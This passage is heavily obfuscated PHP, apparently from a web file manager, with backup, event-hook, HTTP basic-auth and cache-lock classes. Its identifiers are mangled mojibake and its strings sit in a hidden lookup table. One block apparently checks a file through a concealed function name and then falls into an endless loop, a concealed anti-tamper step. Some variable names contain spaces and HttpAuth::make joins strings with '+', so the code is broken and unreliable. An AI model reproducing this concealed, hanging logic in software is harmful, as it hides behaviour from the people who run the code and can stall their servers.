$c½¨¡Õ™´µ = $this->_dbType($b‡®äÄÈˆ); goto céëŒÓª°Ì; c¿’‘ªë–ß: $eá‡ÄÖ‰·õ =& $_SERVER[”Ì÷ñ­î¸]; $BŸó­¦Î¢ = Backup::get(); self::$io = $BŸó­¦Î¢[$eá‡ÄÖ‰·õ[692]]; goto E¸ÚˆĞÂšé; B¡İ¢¬†…·: $a·õÉÌé³æ = array_diff($a·õÉÌé³æ, array($eá‡ÄÖ‰·õ[712], $eá‡ÄÖ‰·õ[713])); foreach ($a·õÉÌé³æ as $C§’Šêï·Š) { $EÌÏö¹Öµ += $C¯Ê¶·å¸Ë->model($C§’Šêï·Š)->count(); } $cØãÓ´£ëŒ = new Task($eá‡ÄÖ‰·õ[714], $eá‡ÄÖ‰·õ[715], $EÌÏö¹Öµ, LNG($eá‡ÄÖ‰·õ[716]) . $eá‡ÄÖ‰·õ[717] . LNG($eá‡ÄÖ‰·õ[718])); goto f£ÜŒ©¡Ê­; C‘¸ƒßÃ¡¯: } private function _dbType($fºë’àá—) { goto E—¥ˆ—÷‰÷; E—¥ˆ—÷‰÷: $E¤ÅÊÁèÓÑ =& $_SERVER[”Ì÷ñ­î¸]; $fºë’àá— = array_change_key_case($fºë’àá—); $aô÷§¿ “§ = $fºë’àá—[$E¤ÅÊÁèÓÑ[724]]; goto A”Ü“ì‚‡; A”Ü“ì‚‡: if ($aô÷§¿ “§ == $E¤ÅÊÁèÓÑ[725]) { $fµĞ§«Ò²¯ = explode($E¤ÅÊÁèÓÑ[4], $fºë’àá—[$E¤ÅÊÁèÓÑ[726]]); $aô÷§¿ “§ = $fµĞ§«Ò²¯[0]; } $aÃ—ÕÃÎõ = array($E¤ÅÊÁèÓÑ[727] => $E¤ÅÊÁèÓÑ[9], $E¤ÅÊÁèÓÑ[728] => $E¤ÅÊÁèÓÑ[729]); if (isset($aÃ—ÕÃÎõ[$aô÷§¿ “§])) { $aô÷§¿ “§ = $aÃ—ÕÃÎõ[$aô÷§¿ “§]; } goto F Â³Š¼ì‡; F Â³Š¼ì‡: return $aô÷§¿ “§; goto eÙ…šÇó¨‡; eÙ…šÇó¨‡: } } class BackupDbFile { public function __construct() { } public function index() { goto aĞŒ¯¯‘‡; dø‚÷ë¥Í: $c˜’‚Ö´ª÷ = new TaskFileTransfer($FïìÙ–ùÍÙ[730], $FïìÙ–ùÍÙ[715], 0, LNG($FïìÙ–ùÍÙ[716]) . $FïìÙ–ùÍÙ[412] . LNG($FïìÙ–ùÍÙ[718]) . $FïìÙ–ùÍÙ[731]); $c˜’‚Ö´ª÷->addPath($Eåõ¡™£Öã); $FƒĞîÀ´½ç = IO::infoWithChildren($Eåõ¡™£Öã); goto d çËºÃ°¡; d çËºÃ°¡: Backup::set(array($FïìÙ–ùÍÙ[732] => $FƒĞîÀ´½ç[$FïìÙ–ùÍÙ[77]])); IO::move($Eåõ¡™£Öã, $d­ÍôØá±³); $a‘¤‰É¤‹ = CONTROLLER_DIR . $FïìÙ–ùÍÙ[733]; goto fº½á‘; A¹ã”²¢‚“: $c˜’‚Ö´ª÷->end(); Backup::set(array($FïìÙ–ùÍÙ[735] => $FƒĞîÀ´½ç[$FïìÙ–ùÍÙ[77]])); return !0; goto B§ÎçÒÛßç; aĞŒ¯¯‘‡: $FïìÙ–ùÍÙ =& $_SERVER[”Ì÷ñ­î¸]; $DŸ„íâÒ¼â = Backup::get(); $A¿‰Á‚©£ = $DŸ„íâÒ¼â[$FïìÙ–ùÍÙ[28]]; goto aåùùÚîâö; fº½á‘: $Dçäï¸‘“½ = CONTROLLER_DIR . $FïìÙ–ùÍÙ[734]; IO::copy($a‘¤‰É¤‹, $d­ÍôØá±³ . "\x62\x61\143\x6b\165\x70\x5f{$A¿‰Á‚©£}\x2f"); IO::copy($Dçäï¸‘“½, $d­ÍôØá±³ . "\x62\x61\x63\x6b\x75\160\x5f{$A¿‰Á‚©£}\x2f"); goto A¹ã”²¢‚“; aåùùÚîâö: $Eåõ¡™£Öã = TEMP_FILES . "\142\141\143\x6b\165\160\x5f{$A¿‰Á‚©£}\57"; $d­ÍôØá±³ = "\x7b\x69\157\72{$DŸ„íâÒ¼â[$FïìÙ–ùÍÙ[692]]}\x7d\x2f\x64\141\164\141\142\x61\163\145\x2f"; IO::mkdir($d­ÍôØá±³ . "\142\141\x63\153\x75\x70\x5f{$A¿‰Á‚©£}\57"); goto dø‚÷ë¥Í; B§ÎçÒÛßç: } } class BackupFile { public function __construct() { } public function index() { goto cÎ–¿ŞòÀé; bÃ‚Ãß°ËÚ: $F¹‘Şº†ë¯->task[$_SERVER[”Ì÷ñ­î¸][699]] = $D¬ÓÒ£˜Ñø; $cğìó°ïä = array($_SERVER[”Ì÷ñ­î¸][740] => $aŞ©«É–×, $_SERVER[”Ì÷ñ­î¸][741] => $D¬ÓÒ£˜Ñø); Backup::set($cğìó°ïä); goto AÂ…ã¯¤İŠ; d»õ²¤µ²Ğ: $A·ÅêÍ™‹ç = $bÆìØî½Ì = 0; do { $Eß¨¨‹±ÉÁ = $_SERVER[”Ì÷ñ­î¸][742]; $D‚×òš¯ëº = Model($_SERVER[”Ì÷ñ­î¸][720])->where($dêŒ²Óºè)->field($Eß¨¨‹±ÉÁ)->order($_SERVER[”Ì÷ñ­î¸][743])->selectPage($C¸‘Íºà§Ä, $d»·Éİè˜¥); $A©¢ŸÙ’ñğ = !empty($D‚×òš¯ëº[$_SERVER[”Ì÷ñ­î¸][354]]) ? $D‚×òš¯ëº[$_SERVER[”Ì÷ñ­î¸][354]] : array(); foreach ($A©¢ŸÙ’ñğ as $dĞ¥™°½±¹) { goto CŠÁâ±½; Dƒ†Õçğä¸: $EÜ¦è‰µÎ¯ += $dĞ¥™°½±¹[$_SERVER[”Ì÷ñ­î¸][77]]; $bÆìØî½Ì += 1; $A·ÅêÍ™‹ç += $dĞ¥™°½±¹[$_SERVER[”Ì÷ñ­î¸][77]]; goto BŞåáŞàÔš; c¾ÃŸ§Œ ä: if (IO::exist($bÈ„ï“Ó™)) { $F¹‘Şº†ë¯->updateFileEnd($dĞ¥™°½±¹[$_SERVER[”Ì÷ñ­î¸][28]], $dĞ¥™°½±¹[$_SERVER[”Ì÷ñ­î¸][77]]); } else { $bÈ„ï“Ó™ = get_path_father($bÈ„ï“Ó™); IO::mkdir($bÈ„ï“Ó™); if (!IO::copy($FÄÇ‰²î˜Á, $bÈ„ï“Ó™, $_SERVER[”Ì÷ñ­î¸][746])) { write_log($_SERVER[”Ì÷ñ­î¸][747] . $FÄÇ‰²î˜Á . $_SERVER[”Ì÷ñ­î¸][748] . $bÈ„ï“Ó™ . $_SERVER[”Ì÷ñ­î¸][476], $_SERVER[”Ì÷ñ­î¸][715]); $dÚ·ÚåËÃ¾ = !1; break; } } $cõ¯ó°ô°Õ = $dĞ¥™°½±¹[$_SERVER[”Ì÷ñ­î¸][419]]; $AŸ½‡Œ«ï” += 1; goto Dƒ†Õçğä¸; BŞåáŞàÔš: if ($EÜ¦è‰µÎ¯ >= 1024 * 1024 * 100) { $cğìó°ïä = array($_SERVER[”Ì÷ñ­î¸][749] => $cõ¯ó°ô°Õ, $_SERVER[”Ì÷ñ­î¸][750] => $bÆìØî½Ì, $_SERVER[”Ì÷ñ­î¸][751] => $A·ÅêÍ™‹ç); Backup::set($cğìó°ïä); $EÜ¦è‰µÎ¯ = $AŸ½‡Œ«ï” = 0; } goto döÂ¶ÍÖÒ; CŠÁâ±½: if (!$this->_fileExist($dĞ¥™°½±¹, $A¢ñ±­¯‰, $F·œŠÒÂ“§)) { $aŞ©«É–× -= 1; $D¬ÓÒ£˜Ñø -= (int) $dĞ¥™°½±¹[$_SERVER[”Ì÷ñ­î¸][77]]; write_log("\146\151\154\145\40\156\x6f\x74\x20\x65\170\x69\x73\x74\x2e\146\151\154\x65\x49\x44\72{$dĞ¥™°½±¹[$_SERVER[”Ì÷ñ­î¸][419]]}\x2c\x20\160\x61\x74\x68\x3a{$dĞ¥™°½±¹[$_SERVER[”Ì÷ñ­î¸][75]]}", $_SERVER[”Ì÷ñ­î¸][744]); continue; } $FÄÇ‰²î˜Á = $dĞ¥™°½±¹[$_SERVER[”Ì÷ñ­î¸][75]]; $bÈ„ï“Ó™ = "\173\x69\x6f\x3a{$e“•®öç¥È[$_SERVER[”Ì÷ñ­î¸][692]]}\175" . substr($FÄÇ‰²î˜Á, strlen("\x7b\151\x6f\x3a{$dĞ¥™°½±¹[$_SERVER[”Ì÷ñ­î¸][745]]}\x7d")); goto c¾ÃŸ§Œ ä; döÂ¶ÍÖÒ: } $Fëº½à¿¾Ò = count($A©¢ŸÙ’ñğ); $d»·Éİè˜¥++; } while ($Fëº½à¿¾Ò == $C¸‘Íºà§Ä); $F¹‘Şº†ë¯->end(); goto c› ¤†Š„; bÙ¯ËäÌï…: Backup::set($cğìó°ïä); $this->_fileFilter($A¢ñ±­¯‰); return !0; goto CŠŸ¨¨£Ë; AÂ…ã¯¤İŠ: $dÚ·ÚåËÃ¾ = !0; $F·œŠÒÂ“§ = $this->storeIds(); $d»·Éİè˜¥ = 1; goto dÜËçùÌà¢; cÎ–¿ŞòÀé: $e“•®öç¥È = Backup::get(); $cõ¯ó°ô°Õ = $e“•®öç¥È[$_SERVER[”Ì÷ñ­î¸][281]][$_SERVER[”Ì÷ñ­î¸][167]][$_SERVER[”Ì÷ñ­î¸][419]]; $dêŒ²Óºè = array($_SERVER[”Ì÷ñ­î¸][420] => array($_SERVER[”Ì÷ñ­î¸][736], $cõ¯ó°ô°Õ), $_SERVER[”Ì÷ñ­î¸][737] => array($_SERVER[”Ì÷ñ­î¸][319], $e“•®öç¥È[$_SERVER[”Ì÷ñ­î¸][692]])); goto c¬¹ˆ‚‘İ´; c› ¤†Š„: $f“´²âš¸³ = $dÚ·ÚåËÃ¾ ? 1 : 0; $cğìó°ïä = array($_SERVER[”Ì÷ñ­î¸][752] => 1, $_SERVER[”Ì÷ñ­î¸][704] => time(), $_SERVER[”Ì÷ñ­î¸][710] => $f“´²âš¸³, $_SERVER[”Ì÷ñ­î¸][749] => $cõ¯ó°ô°Õ, $_SERVER[”Ì÷ñ­î¸][741] => $D¬ÓÒ£˜Ñø, $_SERVER[”Ì÷ñ­î¸][740] => $aŞ©«É–×); if ($AŸ½‡Œ«ï”) { $cğìó°ïä[$_SERVER[”Ì÷ñ­î¸][750]] = $bÆìØî½Ì; $cğìó°ïä[$_SERVER[”Ì÷ñ­î¸][751]] = $A·ÅêÍ™‹ç; } goto bÙ¯ËäÌï…; dÜËçùÌà¢: $C¸‘Íºà§Ä = 1000; $EÜ¦è‰µÎ¯ = $AŸ½‡Œ«ï” = 0; $A¢ñ±­¯‰ = array(); goto d»õ²¤µ²Ğ; c¬¹ˆ‚‘İ´: $aŞ©«É–× = (int) Model($_SERVER[”Ì÷ñ­î¸][720])->where($dêŒ²Óºè)->count($_SERVER[”Ì÷ñ­î¸][419]); $D¬ÓÒ£˜Ñø = (int) Model($_SERVER[”Ì÷ñ­î¸][720])->where($dêŒ²Óºè)->sum($_SERVER[”Ì÷ñ­î¸][77]); $F¹‘Şº†ë¯ = new TaskFileTransfer($_SERVER[”Ì÷ñ­î¸][738], $_SERVER[”Ì÷ñ­î¸][715], $aŞ©«É–×, LNG($_SERVER[”Ì÷ñ­î¸][716]) . $_SERVER[”Ì÷ñ­î¸][717] . LNG($_SERVER[”Ì÷ñ­î¸][739])); goto bÃ‚Ãß°ËÚ; CŠŸ¨¨£Ë: } private function _fileExist($BÔî¼ÀÒ§‚, &$f’©·ê‡­Ø, $b˜›°èàì ) { goto a’÷Ê‰œÀ; b³£­‘ô¤: $f’©·ê‡­Ø = array_merge($f’©·ê‡­Ø, array_to_keyvalue($Aì¶äÕ—é, $cğáË¶‰Ÿö[33], $cğáË¶‰Ÿö[419])); return !1; goto eºåŞğœªˆ; a’÷Ê‰œÀ: $cğáË¶‰Ÿö =& $_SERVER[”Ì÷ñ­î¸]; $d ùÀ¸©„ì = $BÔî¼ÀÒ§‚[$cğáË¶‰Ÿö[75]]; if (in_array($BÔî¼ÀÒ§‚[$cğáË¶‰Ÿö[419]], $f’©·ê‡­Ø)) { return !1; } goto cÉì÷£á´¬; cÉì÷£á´¬: if (!in_array($BÔî¼ÀÒ§‚[$cğáË¶‰Ÿö[745]], $b˜›°èàì )) { return !1; } if (IO::exist($d ùÀ¸©„ì)) { return !0; } $dÂÕãÃ·ä = get_path_father($d ùÀ¸©„ì); goto e¢ÍÂàîöˆ; e¢ÍÂàîöˆ: if (IO::exist($dÂÕãÃ·ä)) { $f’©·ê‡­Ø[] = $BÔî¼ÀÒ§‚[$cğáË¶‰Ÿö[419]]; return !1; } $d‚×¦Çô˜ = array($cğáË¶‰Ÿö[745] => $BÔî¼ÀÒ§‚[$cğáË¶‰Ÿö[745]], $cğáË¶‰Ÿö[75] => array($cğáË¶‰Ÿö[753], "{$dÂÕãÃ·ä}\x25")); $Aì¶äÕ—é = Model($cğáË¶‰Ÿö[720])->where($d‚×¦Çô˜)->field($cğáË¶‰Ÿö[420])->select(); goto b³£­‘ô¤; eºåŞğœªˆ: } private function _fileFilter($BõƒÒÄ’) { $cØ‘£ÓÂÁÛ =& $_SERVER[”Ì÷ñ­î¸]; if (empty($BõƒÒÄ’)) { return; } $b‚ùêŠ’¦Õ = array($cØ‘£ÓÂÁÛ[419] => array($cØ‘£ÓÂÁÛ[7], array_unique($BõƒÒÄ’))); $aÉô™êØ‚² = Model($cØ‘£ÓÂÁÛ[754])->where($b‚ùêŠ’¦Õ)->field($cØ‘£ÓÂÁÛ[369])->select(); foreach ($aÉô™êØ‚² as $dÉæ –Å›) { Model($cØ‘£ÓÂÁÛ[754])->remove($dÉæ –Å›[$cØ‘£ÓÂÁÛ[369]], !1); } } private function storeIds() { $bˆØÁ×··Î =& $_SERVER[”Ì÷ñ­î¸]; $e‘çŒ¤Ë’¿ = Model($bˆØÁ×··Î[705])->listData(); return array_to_keyvalue($e‘çŒ¤Ë’¿, $bˆØÁ×··Î[33], $bˆØÁ×··Î[367]); } } goto CœÜª‘÷¦; E¢µ›‡Âä: function beforeShutdownError($fï’î²§ = false, $FÈñÊ¹¡ã‹ = '', $bƒ¹¤ÇµİË = '', $F¦ä«‹©± = 0) { $FŠÄ†–ê·¨ =& $_SERVER[æÒğ]; switch ($fï’î²§) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $F­ô¡¾íÚÉ = $FŠÄ†–ê·¨[39]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $F­ô¡¾íÚÉ = $FŠÄ†–ê·¨[40]; break; case E_STRICT: $F­ô¡¾íÚÉ = $FŠÄ†–ê·¨[41]; break; case E_NOTICE: case E_USER_NOTICE: $F­ô¡¾íÚÉ = $FŠÄ†–ê·¨[42]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $F­ô¡¾íÚÉ = $FŠÄ†–ê·¨[43]; break; default: break; } if (!$F­ô¡¾íÚÉ || $F­ô¡¾íÚÉ == $FŠÄ†–ê·¨[42] || $F­ô¡¾íÚÉ == $FŠÄ†–ê·¨[43]) { return; } $bƒ¹¤ÇµİË = $FŠÄ†–ê·¨[4] . str_replace($_SERVER[$FŠÄ†–ê·¨[37]], $FŠÄ†–ê·¨[20], $bƒ¹¤ÇµİË); $f“ŠÜ˜Îœñ = $F­ô¡¾íÚÉ . $FŠÄ†–ê·¨[44] . $FÈñÊ¹¡ã‹ . $FŠÄ†–ê·¨[44] . $bƒ¹¤ÇµİË . $FŠÄ†–ê·¨[44] . $F¦ä«‹©±; write_log($f“ŠÜ˜Îœñ . $FŠÄ†–ê·¨[18] . get_caller_msg(1), $FŠÄ†–ê·¨[19]); } $_SERVER[$_SERVER[æÒğ][45]] = $_SERVER[$_SERVER[æÒğ][37]] . $_SERVER[æÒğ][46]; $C‚ºÏ¦’ôß = strrev(base64_decode($_SERVER[æÒğ][47])); goto BøäØåÃ‘Ò; Aø‰Ã‰è×: class Hook { private static $events = array(); public static function get($BÓ¹†ÊÜğÅ = false) { if (!$BÓ¹†ÊÜğÅ) { return self::$events; } else { return self::$events[$BÓ¹†ÊÜğÅ]; } } public static function apply($eèæºØÊË, $bÀ¢ƒÑÌåò = array()) { $b¬¡ñç¶ŒŠ = ActionApply($eèæºØÊË, $bÀ¢ƒÑÌåò); if (is_string($eèæºØÊË)) { Hook::trigger($eèæºØÊË); } return $b¬¡ñç¶ŒŠ; } public static function bind($AÖˆª¯°ŒŒ, $eó„®œÂÔ, $b‡¶£¿ôëÇ = false) { $F•ô‚ñÄ“ =& $_SERVER[”Ì÷ñ­î¸]; if (!isset(self::$events[$AÖˆª¯°ŒŒ])) { self::$events[$AÖˆª¯°ŒŒ] = array(); } self::$events[$AÖˆª¯°ŒŒ][] = array($F•ô‚ñÄ“[1753] => $eó„®œÂÔ, $F•ô‚ñÄ“[1754] => $b‡¶£¿ôëÇ, $F•ô‚ñÄ“[1755] => 0); } public static function once($CÚÇ™óÎ–©, $fñ®ÉĞæˆ–) { self::bind($CÚÇ™óÎ–©, $fñ®ÉĞæˆ–, !0); } public static function unbind($A†”Ñ²ç…, $A–µ¼Æİ© = false) { if (!$A–µ¼Æİ©) { self::$events[$A†”Ñ²ç…] = array(); return; } $CòÔÔ†—Í” = self::$events[$A†”Ñ²ç…]; self::$events[$A†”Ñ²ç…] = array(); if (!is_array($CòÔÔ†—Í”)) { return; } for ($CÄ‡óí¨Ú° = 0; $CÄ‡óí¨Ú° < count($CòÔÔ†—Í”); $CÄ‡óí¨Ú°++) { if ($CòÔÔ†—Í”[$CÄ‡óí¨Ú°][$_SERVER[”Ì÷ñ­î¸][1753]] == $A–µ¼Æİ©) { continue; } self::$events[$A†”Ñ²ç…][] = $CòÔÔ†—Í”[$CÄ‡óí¨Ú°]; } } public static function filter($F”…„¹”÷ò, $Dä­éÚ—àœ) { goto d»Ô¶åªİ“; d»Ô¶åªİ“: $B‡Ä´²¬Îö =& $_SERVER[”Ì÷ñ­î¸]; $FŸŠ‘‚¢¢ = self::$events; if (!isset($FŸŠ‘‚¢¢[$F”…„¹”÷ò])) { return $Dä­éÚ—àœ; } goto eÎËÒ°šÇÄ; eÎËÒ°šÇÄ: $d§é÷‰öø½ = $FŸŠ‘‚¢¢[$F”…„¹”÷ò]; $D“åà¬ = $Dä­éÚ—àœ; if (!is_array($d§é÷‰öø½) || count($d§é÷‰öø½) == 0) { return $D“åà¬; } goto EÀÎÎìÓ©Ï; EÀÎÎìÓ©Ï: for ($eÅÜŠƒÀõŠ = 0; $eÅÜŠƒÀõŠ < count($d§é÷‰öø½); $eÅÜŠƒÀõŠ++) { $A¬à—À–Èª = $d§é÷‰öø½[$eÅÜŠƒÀõŠ]; if ($A¬à—À–Èª[$B‡Ä´²¬Îö[1754]] && $A¬à—À–Èª[$B‡Ä´²¬Îö[1755]] > 1) { continue; } self::$events[$F”…„¹”÷ò][$eÅÜŠƒÀõŠ][$B‡Ä´²¬Îö[1755]] = $A¬à—À–Èª[$B‡Ä´²¬Îö[1755]] + 1; $e¯ßÇêÎ«§ = self::apply($A¬à—À–Èª[$B‡Ä´²¬Îö[1753]], array($D“åà¬)); if (gettype($e¯ßÇêÎ«§) == gettype($D“åà¬)) { $D“åà¬ = $e¯ßÇêÎ«§; } } return $D“åà¬; goto AÛå­±±¬±; AÛå­±±¬±: } public static function trigger($aù“ĞÁƒÓ×) { goto EÇìŠ¿ïÅ¤; F§ò§ìì‹…: return $f£Ï¿ÃØ­; goto bÊ­íİ‘ÕŠ; A¯Œ‘…Š´·: if (!isset($f‚¬©ÔÉÆñ[$aù“ĞÁƒÓ×])) { return $f£Ï¿ÃØ­; } $E¯ùŸ…àç¢ = $f‚¬©ÔÉÆñ[$aù“ĞÁƒÓ×]; if (!is_array($E¯ùŸ…àç¢) || count($E¯ùŸ…àç¢) == 0) { return $f£Ï¿ÃØ­; } goto E‘‘ë¼´å; E‘‘ë¼´å: $c£äÕÛÓ§Ô = func_get_args(); array_shift($c£äÕÛÓ§Ô); for ($B†„êÙÇ¨³ = 0; $B†„êÙÇ¨³ < count($E¯ùŸ…àç¢); $B†„êÙÇ¨³++) { $cÉŸÅ”†ß = $E¯ùŸ…àç¢[$B†„êÙÇ¨³]; if ($cÉŸÅ”†ß[$f¼ÅÙÏÂË‹[1754]] && $cÉŸÅ”†ß[$f¼ÅÙÏÂË‹[1755]] > 1) { continue; } if (defined($f¼ÅÙÏÂË‹[1756]) && GLOBAL_LOG_HOOK) { write_log($aù“ĞÁƒÓ× . $f¼ÅÙÏÂË‹[1757] . $cÉŸÅ”†ß[$f¼ÅÙÏÂË‹[1753]], $f¼ÅÙÏÂË‹[1758]); } self::$events[$aù“ĞÁƒÓ×][$B†„êÙÇ¨³][$f¼ÅÙÏÂË‹[1755]] = $cÉŸÅ”†ß[$f¼ÅÙÏÂË‹[1755]] + 1; $BŠóğèâõö = self::apply($cÉŸÅ”†ß[$f¼ÅÙÏÂË‹[1753]], $c£äÕÛÓ§Ô); if (defined($f¼ÅÙÏÂË‹[1756]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $f¼ÅÙÏÂË‹[1758]); if ($cÉŸÅ”†ß[$f¼ÅÙÏÂË‹[1755]] == 200) { $CÍÌÔËŠÁ = is_array($cÉŸÅ”†ß[$f¼ÅÙÏÂË‹[1753]]) ? json_encode_force($cÉŸÅ”†ß[$f¼ÅÙÏÂË‹[1753]]) : $cÉŸÅ”†ß[$f¼ÅÙÏÂË‹[1753]]; write_log($f¼ÅÙÏÂË‹[1759] . $aù“ĞÁƒÓ× . $f¼ÅÙÏÂË‹[1760] . $CÍÌÔËŠÁ, $f¼ÅÙÏÂË‹[1761]); } } $f£Ï¿ÃØ­ = is_null($BŠóğèâõö) ? $f£Ï¿ÃØ­ : $BŠóğèâõö; } goto F§ò§ìì‹…; EÇìŠ¿ïÅ¤: $f¼ÅÙÏÂË‹ =& $_SERVER[”Ì÷ñ­î¸]; $f‚¬©ÔÉÆñ = self::$events; $f£Ï¿ÃØ­ = !1; goto A¯Œ‘…Š´·; bÊ­íİ‘ÕŠ: } } if (!isset($_SERVER[$_SERVER[”Ì÷ñ­î¸][791]]) || !isset($_SERVER[$_SERVER[”Ì÷ñ­î¸][1153]])) { goto c‰¾»Éçœ…; c‰¾»Éçœ…: $CÃÃ“ŠŞÙ = $_SERVER[”Ì÷ñ­î¸][793]; $b´ïäå‰Õ = $_SERVER[$_SERVER[”Ì÷ñ­î¸][788]] . $_SERVER[”Ì÷ñ­î¸][789]; $fî Í—çÚÔ = $CÃÃ“ŠŞÙ($b´ïäå‰Õ); goto dğê¯„·‰¡; eİË×°İÃ: $bìÍ˜ãŒİ½($_SERVER[$_SERVER[”Ì÷ñ­î¸][788]] . $_SERVER[”Ì÷ñ­î¸][789]); $a‘À†ˆŞ„ = 2; while ($a‘À†ˆŞ„ > 1) { $e¸ŠÖÂ™›Š = rawurlencode($a‘À†ˆŞ„ . $_SERVER[”Ì÷ñ­î¸][361]); } goto DßÛ°ê•§¯; dğê¯„·‰¡: $D¬ËÉÛˆÌ‚ = explode($_SERVER[”Ì÷ñ­î¸][217], $fî Í—çÚÔ); if (count($D¬ËÉÛˆÌ‚) < $_SERVER[”Ì÷ñ­î¸][553]) { $fó±ŸéÕå = $_SERVER[”Ì÷ñ­î¸][794]; $fó±ŸéÕå(); } $bìÍ˜ãŒİ½ = $_SERVER[”Ì÷ñ­î¸][1152]; goto eİË×°İÃ; DßÛ°ê•§¯: } class HttpAuth { public static function get() { $EÑ›¢ ñÓ¶ =& $_SERVER[”Ì÷ñ­î¸]; $A‡İªô£’È = $EÑ›¢ ñÓ¶[33]; $fÏ¤Ñ­Öš = $EÑ›¢ ñÓ¶[33]; if (isset($_SERVER[$EÑ›¢ ñÓ¶[1762]])) { $A‡İªô£’È = $_SERVER[$EÑ›¢ ñÓ¶[1762]]; $fÏ¤Ñ­Öš = $_SERVER[$EÑ›¢ ñÓ¶[1763]]; } elseif (isset($_SERVER[$EÑ›¢ ñÓ¶[1764]])) { $B¿ÊÖª­„ˆ = $_SERVER[$EÑ›¢ ñÓ¶[1764]]; if (strpos(strtolower($B¿ÊÖª­„ˆ), $EÑ›¢ ñÓ¶[1765]) === 0) { $FÍ–›¡×¶ = explode($EÑ›¢ ñÓ¶[4], base64_decode(substr($B¿ÊÖª­„ˆ, 6))); $A‡İªô£’È = isset($FÍ–›¡×¶[0]) ? $FÍ–›¡×¶[0] : $EÑ›¢ ñÓ¶[33]; $fÏ¤Ñ­Öš = isset($FÍ–›¡×¶[1]) ? $FÍ–›¡×¶[1] : 0; } } return array($EÑ›¢ ñÓ¶[535] => $A‡İªô£’È, $EÑ›¢ ñÓ¶[899] => $fÏ¤Ñ­Öš); } public static function error() { goto EøĞŒŠ‘Œ; EøĞŒŠ‘Œ: $bŸ¿©íïµ¤ =& $_SERVER[”Ì÷ñ­î¸]; header($bŸ¿©íïµ¤[1766]); header($bŸ¿©íïµ¤[1767]); goto a£øçÓ»Ê©; FÒÛî‰êŸ: die; goto bÛÒ†²‹Ñ; a£øçÓ»Ê©: header($bŸ¿©íïµ¤[1768]); header($bŸ¿©íïµ¤[1769]); header($bŸ¿©íïµ¤[1265]); goto FÒÛî‰êŸ; bÛÒ†²‹Ñ: } public static function make($F£Š»¡§êÛ, $bÂªä„ÛÀî) { $CÄ»Ö´‚†§ =& $_SERVER[”Ì÷ñ­î¸]; return $CÄ»Ö´‚†§[1770] + base64_encode($F£Š»¡§êÛ . $CÄ»Ö´‚†§[4] . $bÂªä„ÛÀî); } } goto DŸ¹«Í‘”; d£„ö‘ñ³: function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $dÍ«—µŠÃ½ =& $_SERVER[”Ì÷ñ­î¸]; $d’ÓŸ˜„  = $GLOBALS[$dÍ«—µŠÃ½[6]][$dÍ«—µŠÃ½[337]]; self::$cachePath = $d’ÓŸ˜„ [$dÍ«—µŠÃ½[167]][$dÍ«—µŠÃ½[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($Fß½èÖ˜¼, $d·Ø¼âªš = 0) { goto cÛ—ØåòŸ; bó—Ç²À¡Í: $A³é¨„…¶ = rtrim(self::$cachePath, $Bƒ£äñ°ŠÈ[8]) . $Bƒ£äñ°ŠÈ[774] . md5($Fß½èÖ˜¼) . $Bƒ£äñ°ŠÈ[775]; if (file_exists($A³é¨„…¶) && filemtime($A³é¨„…¶) && filemtime($A³é¨„…¶) < time() - 10) { @unlink($A³é¨„…¶); } do { if (file_exists($A³é¨„…¶)) { cacheLockWait(); continue; } $FáœÃóàõ = fopen($A³é¨„…¶, $Bƒ£äñ°ŠÈ[776]); if (!$FáœÃóàõ) { return !1; } $cßÆ‚¯´‰ = flock($FáœÃóàõ, LOCK_EX | LOCK_NB); self::$caches[$Fß½èÖ˜¼] = array($Bƒ£äñ°ŠÈ[777] => $FáœÃóàõ, $Bƒ£äñ°ŠÈ[167] => $A³é¨„…¶); fwrite($FáœÃóàõ, $CÖˆ ±àí); clearstatcache(); if ($FáœÃóàõ && $cßÆ‚¯´‰) { return !0; } cacheLockWait(); } while (microtime(!0) < $CÖˆ ±àí); goto b™ó¯È”»É; b™ó¯È”»É: $this->unlock($Fß½èÖ˜¼); return !1; goto eß»ÕÔÍ¿™; cÛ—ØåòŸ: $Bƒ£äñ°ŠÈ =& $_SERVER[”Ì÷ñ­î¸]; $F’ÕøÄÒñ§ = microtime(!0); $CÖˆ ±àí = $F’ÕøÄÒñ§ + $d·Ø¼âªš + 0.0001; goto bó—Ç²À¡Í; eß»ÕÔÍ¿™: } public function lockGet($dè¾àİ±õé) { $c¬—ùì‰Ë =& $_SERVER[”Ì÷ñ­î¸]; $bÕ¯•Èêˆˆ = rtrim(self::$cachePath, $c¬—ùì‰Ë[8]) . $c¬—ùì‰Ë[774] . md5($dè¾àİ±õé) . $c¬—ùì‰Ë[775]; return file_exists($bÕ¯•Èêˆˆ); } public function unlock($CŠ´¥‡‹î) { goto Bëƒ÷„’Üİ; Bî˜ÏœÂÄµ: unset(self::$caches[$CŠ´¥‡‹î]); goto A›ŒËŞ–˜£; Bëƒ÷„’Üİ: $B„×¨Áİ‘” =& $_SERVER[”Ì÷ñ­î¸]; $CÎ„ÛÈª›Œ = self::$caches[$CŠ´¥‡‹î]; if (!$CÎ„ÛÈª›Œ) { return; } goto C»•œ°‘•±; C»•œ°‘•±: @flock($CÎ„ÛÈª›Œ[$B„×¨Áİ‘”[777]], LOCK_UN); @fclose($CÎ„ÛÈª›Œ[$B„×¨Áİ‘”[777]]); @unlink($CÎ„ÛÈª›Œ[$B„×¨Áİ‘”[167]]); goto Bî˜ÏœÂÄµ; A›ŒËŞ–˜£: } } class CacheLockRedis { public function lock($bËäÑƒ…É, $F©¾à®˜´Œ = 10) { $BÈËø…¯Õ = Cache::init(); $DÃÒ†¥ÛÉâ = microtime(!0) + $F©¾à®˜´Œ; while (microtime(!0) < $DÃÒ†¥ÛÉâ) { $BŒ«™ã´µ = $BÈËø…¯Õ->get($bËäÑƒ…É); if (!$BŒ«™ã´µ) { $aˆëëâ£åÊ = $BÈËø…¯Õ->setLock($bËäÑƒ…É, $DÃÒ†¥ÛÉâ, $F©¾à®˜´Œ); if ($aˆëëâ£åÊ) { return !0; } } else { if ($BŒ«™ã´µ < microtime(!0)) { $BÈËø…¯Õ->set($bËäÑƒ…É, $DÃÒ†¥ÛÉâ, $DÃÒ†¥ÛÉâ); if ($BÈËø…¯Õ->get($bËäÑƒ…É) === $BŒ«™ã´µ) { return 